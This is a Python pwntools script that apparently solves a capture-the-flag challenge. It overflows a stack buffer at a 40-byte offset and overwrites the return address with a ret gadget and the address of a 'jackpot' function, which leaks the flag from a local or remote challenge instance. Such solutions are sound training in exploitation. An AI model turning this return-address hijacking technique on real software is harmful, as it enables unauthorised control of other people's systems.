#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./Chall")
# context.log_level = 'debug'

def get_io():
    if args.REMOTE:
        return remote("instancer.dalctf2026.com", 49480)
    else:
        return process("./Chall")

# jackpot = 0x401206
# ret = 0x40101a

def solve():
    io = get_io()
    
    # Offset to return address is 40
    # Payload: "exit\x00" + padding + ret_gadget + jackpot
    # Using "exit\x00" to trigger the return immediately
    
    ret_gadget = 0x40101a
    jackpot_addr = elf.sym['jackpot']
    
    payload = b"exit\x00"
    payload += b"A" * (40 - len(payload))
    payload += p64(ret_gadget)
    payload += p64(jackpot_addr)
    
    io.sendlineafter(b"> ", payload)
    
    try:
        io.recvuntil(b"Flag: ")
        flag = io.recvline().decode().strip()
        print(f"FLAG: {flag}")
    except EOFError:
        print("Failed to get flag")
    
    io.close()

if __name__ == "__main__":
    solve()
